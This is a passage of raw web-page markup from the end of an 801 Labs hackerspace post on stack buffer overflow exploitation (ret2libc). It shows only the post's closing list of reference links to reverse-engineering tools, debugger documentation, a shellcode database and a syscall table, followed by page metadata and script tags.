href=\"https://i.imgur.com/ewrWkEa.png\"\u003eReverse Engineering\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/radare/radare2/blob/master/doc/intro.md\"\u003eradare2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eOther\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://shell-storm.org/shellcode/\"\u003eShellcode Database\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://sourceware.org/gdb/current/onlinedocs/gdb/\"\u003eGDB documentation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://gef.readthedocs.io/en/master/\"\u003eGEF documentation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://asm.sourceforge.net/syscall.html\"\u003eLinux 32bit syscalls\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},"__N_SSG":true},"page":"/research-portal/post/[slug]","query":{"slug":"stack-exploitation"},"buildId":"hP1ulVue4dElPSAc2chzm","nextExport":false,"isFallback":false,"gsp":true,"head":[["meta",{"charSet":"utf-8"}],["title",{"children":"Exploiting a Stack Buffer Overflow (ret2libc method) | 801 Labs"}],["meta",{"name":"description","content":"description"}],["link",{"rel":"canonical","href":"https://www.801labs.org/research-portal/post/stack-exploitation"}],["link",{"rel":"icon","href":"/favicon.png","sizes":"16x16"}],["meta",{"property":"og:title","content":"Exploiting a Stack Buffer Overflow (ret2libc method) | 801 Labs"}],["meta",{"property":"og:description","content":"801 Labs is a Salt Lake City based hackerspace created by local information technology, electronics, and information security enthusiasts."}],["meta",{"property":"og:image","content":"https://www.801labs.org2019/01/gef.jpg"}],["meta",{"property":"og:url","content":"https://www.801labs.org/research-portal/post/stack-exploitation"}],["meta",{"property":"og:site_name","content":"801 Labs"}],["meta",{"name":"twitter:card","content":"summary_large_image"}],["meta",{"name":"twitter:site","content":"@801Labs"}],["meta",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["meta",{"name":"theme-color","content":"#6bf0c2"}],["link",{"href":"https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;0,900;1,400\u0026family=Tomorrow:wght@400;600;700\u0026display=swap","rel":"stylesheet"}],["meta",{"name":"google-site-verification","content":"QnlAT_0caLTAeL1e8V-RlHWBX7xauM_CnxY_5-ltIF4"}]]}</script><script nomodule="" src="/_next/static/chunks/polyfills-08fbb0bb0c9e09648ed7.js"></script><script src="/_next/static/chunks/main-b734f4d0c2c599295fe6.js" async=""></script><script src="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" async=""></script><script src="/_next/static/chunks/framework.464b393922c27508c360.js" async=""></script><script src="/_next/static/chunks/commons.baecec2b1f31cc8f0ab6.js" async=""></script><script src="/_next/static/chunks/pages/_app-e662323251d69bbbf5e5.js" async=""></script><script src="/_next/static/chunks/cb1608f2.9b44609261640b8f626b.js" async=""></script><script src="/_next/static/chunks/a9a7754c.53d20200875279da8636.js" async=""></script><script src="/_next/static/chunks/16bc220b6d50f93026463b2cd002c45681ffbe2f.62ec2799f7445d763091.js" async=""></script><script src="/_next/static/chunks/269ea3ef5216fdb5e29fe1b24ee03a8936e3d31a.82f69e01bd7fbd7d6f07.js" async=""></script><script src="/_next/static/chunks/pages/research-portal/post/%5Bslug%5D-4d5753f44f6a2e9d1cc2.js" async=""></script><script src="/_next/static/hP1ulVue4dElPSAc2chzm/_buildManifest.js" async=""></script><script src="/_next/static/hP1ulVue4dElPSAc2chzm/_ssgManifest.js" async=""></script></body></html>